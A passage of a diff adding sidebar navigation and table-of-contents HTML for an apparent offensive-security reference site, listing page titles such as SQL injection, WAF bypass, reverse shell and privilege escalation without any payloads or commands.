+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Direct Object References" data-md-level="1">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Management Interface" data-md-level="1">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure management interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Source Code Management" data-md-level="1">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure source code management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_25" type="checkbox" id="__nav_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JSON Web Token" data-md-level="1">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_26" type="checkbox" id="__nav_26" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java RMI" data-md-level="1">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_27" type="checkbox" id="__nav_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Kubernetes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_28" type="checkbox" id="__nav_28" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LDAP Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LDAP%20Injection/" class="md-nav__link">
+        LDAP injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_29" type="checkbox" id="__nav_29" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LaTeX Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_30" type="checkbox" id="__nav_30" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Methodology and Resources" data-md-level="1">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Azure Active Directory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_31" type="checkbox" id="__nav_31" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="NoSQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_32" type="checkbox" id="__nav_32" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32">
+          OAuth
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OAuth" data-md-level="1">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OAuth/" class="md-nav__link">
+        OAuth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_33" type="checkbox" id="__nav_33" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Open Redirect" data-md-level="1">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_34" type="checkbox" id="__nav_34" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Race Condition" data-md-level="1">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_35" type="checkbox" id="__nav_35" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Request Smuggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_36" type="checkbox" id="__nav_36" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SAML Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_37" type="checkbox" id="__nav_37" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          SQL injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        SQL injection
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#entry-point-detection" class="md-nav__link">
+    Entry point detection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dbms-identification" class="md-nav__link">
+    DBMS Identification
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-using-sqlmap" class="md-nav__link">
+    SQL injection using SQLmap
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL injection using SQLmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-arguments-for-sqlmap" class="md-nav__link">
+    Basic arguments for SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#load-a-request-file-and-use-mobile-user-agent" class="md-nav__link">
+    Load a request file and use mobile user-agent
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-injection-in-useragentheaderreferercookie" class="md-nav__link">
+    Custom injection in UserAgent/Header/Referer/Cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#second-order-injection" class="md-nav__link">
+    Second order injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-a-website-with-sqlmap-and-auto-exploit" class="md-nav__link">
+    Crawl a website with SQLmap and auto-exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-tor-with-sqlmap" class="md-nav__link">
+    Using TOR with SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-a-proxy-with-sqlmap" class="md-nav__link">
+    Using a proxy with SQLmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-chrome-cookie-and-a-proxy" class="md-nav__link">
+    Using Chrome cookie and a Proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-suffix-to-tamper-the-injection" class="md-nav__link">
+    Using suffix to tamper the injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#general-tamper-option-and-tampers-list" class="md-nav__link">
+    General tamper option and tamper's list
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap-without-sql-injection" class="md-nav__link">
+    SQLmap without SQL injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    Authentication bypass
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass-raw-md5-sha1" class="md-nav__link">
+    Authentication Bypass (Raw MD5 SHA1)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot-injection-multicontext" class="md-nav__link">
+    Polyglot injection (multicontext)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#routed-injection" class="md-nav__link">
+    Routed injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insert-statement-on-duplicate-key-update" class="md-nav__link">
+    Insert Statement - ON DUPLICATE KEY UPDATE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypass" class="md-nav__link">
+    WAF Bypass
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#white-spaces-alternatives" class="md-nav__link">
+    White spaces alternatives
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-comma" class="md-nav__link">
+    No Comma
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-equal" class="md-nav__link">
+    No Equal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#case-modification" class="md-nav__link">
+    Case modification
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obfuscation-by-dbms" class="md-nav__link">
+    Obfuscation by DBMS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#more-mysql-specific" class="md-nav__link">
+    More MySQL specific
+  </a>
+  
+    <nav class="md-nav" aria-label="More MySQL specific">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass-for-mysql-using-scientific-notation" class="md-nav__link">
+    WAF bypass for MySQL using scientific notation
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_38" type="checkbox" id="__nav_38" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Request Forgery" data-md-level="1">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_39" type="checkbox" id="__nav_39" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Template Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Templates Injections
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_40" type="checkbox" id="__nav_40" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tabnabbing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_41" type="checkbox" id="__nav_41" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Type Juggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Type%20Juggling/" class="md-nav__link">
+        PHP Juggling type and magic hashes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42" type="checkbox" id="__nav_42" >
+      
